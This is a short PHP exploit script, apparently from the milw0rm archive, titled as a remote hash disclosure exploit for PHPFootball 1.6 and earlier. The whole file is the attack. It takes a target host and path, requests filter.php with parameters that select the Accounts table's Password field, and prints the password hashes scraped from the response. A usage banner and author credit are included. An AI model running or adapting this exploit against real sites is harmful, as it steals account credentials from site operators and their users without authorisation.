<?php

// http://garr.dl.sourceforge.net/sourceforge/phpfootball/PHPfootball1.6.zip

$host = $argv[1];
$path = $argv[2];

if ($argc != 3) {
    
    echo "PHPFootball <= 1.6 (filter.php) Remote Hash Disclosure Exploit\n";
    echo "by KinG-LioN - http://eurohackers.it\n";
    echo "Usage: php {$argv[0]} <host> <path>\n";
    exit;
}
else {

   $head .= "GET /{$path}/filter.php?dbtable=Accounts&dbfield=Password HTTP/1.1\r\n";
   $head .= "Host: {$host}\r\n";
   $head .= "Connection: close\r\n\r\n";
   
   $fsock = fsockopen ($host,80);
   fputs ($fsock,$head);
   
   while (!feof($fsock)) {
     $cont .= fgets($fsock);
   } 
    fclose($fsock); 
    
    if (preg_match_all("/<td class=td>(.+?)<\/td>/",$cont,$i)) {
        print_r($i[1]);
   } 
   else {
       die ("exploit error\n");
   }
}


?>

# milw0rm.com [2009-01-01]